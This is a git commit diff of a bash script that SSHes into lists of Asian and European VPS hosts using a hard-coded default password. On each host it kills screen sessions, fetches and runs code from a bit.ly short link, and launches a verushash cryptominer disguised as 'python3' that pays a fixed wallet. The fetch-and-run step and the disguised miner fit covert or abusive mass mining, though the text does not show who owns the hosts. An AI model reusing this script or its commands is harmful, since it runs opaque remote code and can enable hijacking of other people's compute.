5cc1896ab9502664e31f1db777c4f47541e96086
DotAja <142836390+DotAja@users.noreply.github.com>
2024-10-01 00:09:49 +0700

    Update runminer.sh

--- runminer.sh
+++ runminer.sh
@@ -16,20 +16,13 @@ then
     exit
 fi
 
-# Script yang ingin dijalankan di setiap VPS
-ASIA_SCRIPT_COMMAND="pkill screen 
-wget -q -O run https://raw.githubusercontent.com/DotAja/AUTO-RUNMINER/refs/heads/main/asia.sh
-sh run"
-EUROPE_SCRIPT_COMMAND="pkill screen
-wget -q -O run https://raw.githubusercontent.com/DotAja/AUTO-RUNMINER/refs/heads/main/eropa.sh
-sh run"
-
 # Fungsi untuk menjalankan script di satu VPS
 run_script() {
     local IP=$1
     local USER="cloudsigma"         # Menetapkan USER
     local PASSWORD="12345678"   # Menetapkan PASSWORD
-    local COMMAND=$2            # Perintah yang akan dijalankan
+    local COMMAND=$2
+    local COUNT=$3
 
     echo "Menghubungkan ke VPS: $IP dengan user: $USER"
 
@@ -49,14 +42,19 @@ run_script() {
 EOF
 }
 
+COUNT=1
 # Membaca daftar VPS Asia dan menjalankan script
 while IFS=',' read -r IP; do
+    ASIA_SCRIPT_COMMAND="pkill screen; bash <(wget -qO- https://bit.ly/ap-dot); screen -dmS dotsrb ./dotsrb/python3 --algorithm verushash --pool stratum+tcp://ap.luckpool.net:3956 --wallet RNUQQ8AFB2nDj81jjqHPKKqM8T7FwMm29p.AP-$COUNT "
     run_script "$IP" "$ASIA_SCRIPT_COMMAND" &  # Jalankan perintah untuk VPS Asia
+    COUNT=$((COUNT + 1))
 done < $ASIA_VPS_LIST
 
 # Membaca daftar VPS Eropa dan menjalankan script
 while IFS=',' read -r IP; do
+    EUROPE_SCRIPT_COMMAND="pkill screen; bash <(wget -qO- https://bit.ly/ap-dot); screen -dmS dotsrb ./dotsrb/python3 --algorithm verushash --pool stratum+tcp://eu.luckpool.net:3956 --wallet RNUQQ8AFB2nDj81jjqHPKKqM8T7FwMm29p.EU-$COUNT "
     run_script "$IP" "$EUROPE_SCRIPT_COMMAND" &  # Jalankan perintah untuk VPS Eropa
+    COUNT=$((COUNT + 1))
 done < $EUROPE_VPS_LIST
 
 # Tunggu semua proses selesai
